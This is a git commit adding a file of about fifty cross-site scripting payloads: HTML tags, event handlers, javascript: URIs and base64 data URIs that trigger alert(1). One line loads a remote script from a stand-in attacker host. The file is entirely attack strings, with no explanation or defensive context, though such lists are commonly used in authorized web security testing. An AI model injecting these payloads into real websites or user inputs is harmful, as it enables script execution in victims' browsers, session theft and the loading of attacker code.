0b185d35312a8a63e5bf4fa5e7d1a8e50a141252
soheil vanaee <119595980+soheil-vanaee@users.noreply.github.com>
2024-08-10 13:06:44 +0330

    Create payloads.js

---
+++ payloads.js
@@ -0,0 +1,50 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<form action="javascript:alert(1)">
+<input type="text" value="XSS" onfocus="alert(1)">
+<style>*{xss:expression(alert(1))}</style>
+<link rel="stylesheet" href="javascript:alert(1)">
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)"></embed>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<table background="javascript:alert(1)">
+<div style="background-image: url(javascript:alert(1))">
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+<marquee onstart=alert(1)>
+<bgsound src="javascript:alert(1)">
+<isindex action="javascript:alert(1)">
+<button onclick=alert(1)>Click me</button>
+<keygen autofocus onfocus=alert(1)>
+<script src="https://attacker.com/xss.js"></script>
+<audio src="javascript:alert(1)">
+<video src="javascript:alert(1)">
+<details open ontoggle=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<select onchange=alert(1)>
+<textarea oninput=alert(1)>
+<math href="javascript:alert(1)">
+<mtext onclick=alert(1)>XSS</mtext>
+<object data="javascript:alert(1)" type="text/html"></object>
+<a href="http://example.com" onclick="alert(1)">Link</a>
+<form><button formaction="javascript:alert(1)">Submit</button></form>
+<applet code="javascript:alert(1)"></applet>
+<xss style="behavior:url(#default#time2)" onbegin="alert(1)"></xss>
+<img dynsrc="javascript:alert(1)">
+<input type="image" src="javascript:alert(1)">
+<img lowsrc="javascript:alert(1)">
+<meta charset="x-user-defined" content="javascript:alert(1)">
+<input type="text" onmouseover="alert(1)">
+<base href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<input type="text" onkeydown="alert(1)">
+<img srcset="javascript:alert(1) 2x">
+<input type="button" value="Click me" onclick="alert(1)">
+<blink onmouseover="alert(1)">XSS</blink>
+<img src="x" onerror="javascript:alert(1)">
+<p draggable="true" ondragstart="alert(1)">Drag me</p>
+<object type="text/html" data="javascript:alert(1)"></object>
+<form onsubmit="alert(1)"><input type="submit"></form>
